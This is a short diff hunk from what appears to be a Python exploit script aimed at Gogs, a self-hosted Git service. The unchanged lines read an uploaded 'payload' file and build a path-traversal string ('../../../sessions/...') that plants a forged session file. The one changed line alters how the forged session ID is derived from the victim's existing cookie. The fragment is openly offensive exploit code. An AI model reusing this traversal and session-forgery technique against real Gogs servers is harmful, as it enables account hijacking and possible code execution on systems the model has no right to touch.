@@ -238,7 +238,7 @@ class Gogs:
 
         content = open('payload', 'rb').read()
         old = self.session.cookies.get(self.cookie_name)
-        sess = '{}001337'.format(old[:4])  # edit for m0r3 sw4g
+        sess = '{}001337'.format(old[:-6])  # edit for m0r3 sw4g
 
         payload = '../../../sessions/{}/{}/{}'.format(sess[0], sess[1], sess)
         if self.windows:
